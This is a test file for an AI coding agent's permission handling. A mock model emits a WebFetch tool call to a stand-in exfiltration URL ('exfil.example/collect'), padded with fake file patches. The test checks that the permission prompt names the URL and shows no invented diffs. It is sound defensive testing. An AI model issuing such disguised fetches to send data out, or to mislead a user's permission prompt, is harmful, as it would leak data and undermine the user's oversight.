// Over a real `orb acp` process in an untrusted folder with the person's own `ask` rule: a WebFetch whose model-written
// input carries a `files` array is shown as the fetch it is, with its URL in the title and no invented diffs.
import { expect, test } from "bun:test"
import fs from "node:fs/promises"
import os from "node:os"
import path from "node:path"
import { isolatedEnv } from "../fixture/environment"

const patch = (name: string) =>
  `Index: ${name}\n===\n--- ${name}\n+++ ${name}\n@@ -1,1 +1,1 @@\n-# Title\n+# Title (typo fixed)\n`
const url = "https://exfil.example/collect?d=1"

test("an untrusted WebFetch with a model-added files array is titled by its URL and has no diffs", async () => {
  const root = await fs.mkdtemp(path.join(os.tmpdir(), "orbit-acp-files-"))
  const workspace = path.join(root, "workspace")
  const config = path.join(root, "config")
  const models = path.join(root, "models.json")
  await Promise.all([fs.mkdir(workspace, { recursive: true }), fs.mkdir(config)])
  await Bun.write(models, "{}")
  let primary = 0
  const llm = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    async fetch(request) {
      const body: any = await request.json().catch(() => undefined)
      primary += body?.tools ? 1 : 0
      const call = Boolean(body?.tools) && primary === 1
      const delta = call
        ? {
            tool_calls: [
              {
                index: 0,
                id: "call_1",
                type: "function",
                function: {
                  name: "WebFetch",
                  arguments: JSON.stringify({
                    url,
                    files: [
                      { file: "README.md", patch: patch("README.md") },
                      { file: "docs.md", patch: patch("docs.md") },
                    ],
                  }),
                },
              },
            ],
          }
        : { content: "done" }
      const chunks = [
        { choices: [{ delta: { role: "assistant" }, finish_reason: null }], usage: null },
        { choices: [{ delta, finish_reason: null }], usage: null },
        { choices: [{ delta: {}, finish_reason: call ? "tool_calls" : "stop" }], usage: null },
        { choices: [], usage: { prompt_tokens: 10, completion_tokens: 1, total_tokens: 11 } },
      ]
      return new Response(`${chunks.map((chunk) => `data: ${JSON.stringify(chunk)}\n\n`).join("")}data: [DONE]\n\n`, {
        headers: { "content-type": "text/event-stream" },
      })
    },
  })
  await Bun.write(
    path.join(config, "orbit.json"),
    JSON.stringify({
      update: "disable",
      model: "test/test-model",
      permissions: [{ action: "WebFetch", resource: "*", effect: "ask" }],
      providers: {
        test: {
          name: "Test",
          package: "aisdk:@ai-sdk/openai-compatible",
          settings: { apiKey: "test-key", baseURL: `http://127.0.0.1:${llm.port}/v1` },
          models: {
            "test-model": {
              name: "Test Model",
              capabilities: { tools: true, input: ["text"], output: ["text"] },
              cost: { input: 0, output: 0 },
              limit: { context: 100_000, output: 10_000 },
            },
          },
        },
      },
    }),
  )
  // ORBIT_TRUST_PROJECT is unset: the folder is untrusted.
  const child = Bun.spawn([process.execPath, "run", "src/index.ts", "acp"], {
    cwd: path.join(import.meta.dir, "../.."),
    env: isolatedEnv(root, {
      USERPROFILE: root,
      ORBIT_CONFIG: undefined,
      ORBIT_CONFIG_CONTENT: undefined,
      ORBIT_DISABLE_AUTOUPDATE: "true",
      ORBIT_MODELS_PATH: models,
      ORBIT_TRUST_PROJECT: undefined,
    }),
    stdin: "pipe",
    stdout: "pipe",
    stderr: "pipe",
  })
  const stderr = new Response(child.stderr).text()
  const pending = new Map<number, (value: any) => void>()
  const permissions: any[] = []
  const write = async (message: unknown) => {
    child.stdin.write(`${JSON.stringify(message)}\n`)
    await child.stdin.flush()
  }
  const reader = (async () => {
    const decoder = new TextDecoder()
    let buffered = ""
    for await (const chunk of child.stdout) {
      buffered += decoder.decode(chunk, { stream: true })
      while (buffered.includes("\n")) {
        const line = buffered.slice(0, buffered.indexOf("\n")).trim()
        buffered = buffered.slice(buffered.indexOf("\n") + 1)
        if (!line) continue
        const message = JSON.parse(line)
        if (message.method && message.id !== undefined) {
          if (message.method === "session/request_permission") {
            permissions.push(message.params)
            await write({
              jsonrpc: "2.0",
              id: message.id,
              result: { outcome: { outcome: "selected", optionId: "reject" } },
            })
            continue
          }
          await write({ jsonrpc: "2.0", id: message.id, error: { code: -32601, message: "not supported" } })
          continue
        }
        if (message.id !== undefined) pending.get(message.id)?.(message)
      }
    }
  })()
  let next = 1
  const request = (method: string, params: unknown) =>
    new Promise<any>((resolve, reject) => {
      const id = next++
      const timer = setTimeout(() => reject(new Error(`timed out waiting for ${method}`)), 60_000)
      pending.set(id, (value) => {
        clearTimeout(timer)
        resolve(value)
      })
      void write({ jsonrpc: "2.0", id, method, params })
    })
  try {
    await request("initialize", {
      protocolVersion: 1,
      clientCapabilities: {},
      clientInfo: { name: "test", version: "0" },
    })
    const session = await request("session/new", { cwd: workspace, mcpServers: [] })
    await request("session/prompt", { sessionId: session.result.sessionId, prompt: [{ type: "text", text: "go" }] })
    const call = permissions[0]?.toolCall
    expect(String(call?.title)).toContain("exfil.example")
    expect(call?.content ?? []).toHaveLength(0)
  } finally {
    child.stdin.end()
    const exited = await Promise.race([child.exited, Bun.sleep(5_000).then(() => undefined)])
    if (exited === undefined) child.kill("SIGKILL")
    await child.exited
    await reader.catch(() => {})
    void (await stderr)
    llm.stop(true)
    await fs.rm(root, { recursive: true, force: true, maxRetries: 20, retryDelay: 100 }).catch(() => {})
  }
}, 90_000)
